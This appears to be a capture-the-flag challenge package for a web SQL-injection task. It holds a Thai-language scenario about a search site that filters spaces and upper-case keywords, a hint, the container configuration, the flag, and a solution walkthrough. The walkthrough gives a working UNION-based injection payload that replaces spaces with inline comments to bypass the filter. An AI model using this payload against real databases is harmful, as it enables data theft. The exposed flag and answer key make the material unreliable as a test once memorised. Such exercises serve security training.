# Students List

| Category | Difficulty | Point |
| :-: | :-: | :-: |
| Web | Normal | 200 |

สมพงษ์อยากไปงาน Event Blue Archive Big Fan แต่พอไปทางเข้า ดันเจอด่านตรวจ โดยที่ให้ตอบชื่อจากรูปที่โจทย์มาให้ สมพงษ์เก่งพอจะรู้ว่ารูปนี้คือใคร แต่ปัญหาคือเขาดันสะกดเปะๆ ไม่ถูก ด้วยความที่เข้าเป็น vibe coder เขาจึง speed run ทำเว็บเพื่อแสดงผลชื่อตามที่ search ชื่อก็ได้รายชื่อตัวละครมาแล้ว และเพื่อความปลอดภัย เขาจึงป้องกันการโดน SQL Injection โดยการ Block คำอันตราย และ Space เขามั่นใจว่ายังไงก็ไม่โดนแล้ว และแล้วเขาก็เจอคุณในงาน ถึงพูดคุยกันเรื่องเว็บที่เขาสร้าง และเขาก็ได้ท้าคุณผู้เป็น Hacker ผู้มีประสบการณ์ โดยที่เขาท้ามาว่า ให้หาข้อมูลที่ถูกซ่อนไว้ใน database ที่อยู่ใน table secret_flag

Format: `CSUBRU{...}`

---

## Hints

Hint: ถูก block แค่ Upper Case

---

## Configuration

| Name | Value |
| :- | :- |
| Title | Students List |
| Type | Static Container |
| Category | Web |
| Max Attempts Allowed |  |
| Blood Bonus |  |
| Container Image | `ic-students-list` |
| Service Port | 80 |
| CPU Limit (0.1 CPUs) |  |
| Memory Limit (MB) |  |
| Storage Limit (MB) |  |

### Flags

- `CSUBRU{sp4c3_is_34sy_70_by_p4ss_0r_n07?_hm}`

### Build

- `docker build -t ic-students-list build`

---

## Analysis

1. Submit test queries to observe that the application strips spaces and rejects any upper-case SQL keywords such as `UNION` or `SELECT`.
2. Swap spaces for `/**/` comments and write your payload entirely in lower case to bypass the filter.
3. Use an input like:
   ```text
   '/**/union/**/select/**/9999,flag,'x','y'/**/from/**/secret_flag--
   ```
   inside the search box to break out of the `LIKE` clause.
4. The response will include a synthetic row with the flag value (`CSUBRU{sp4c3_is_34sy_70_by_p4ss_0r_n07?_hm}`).
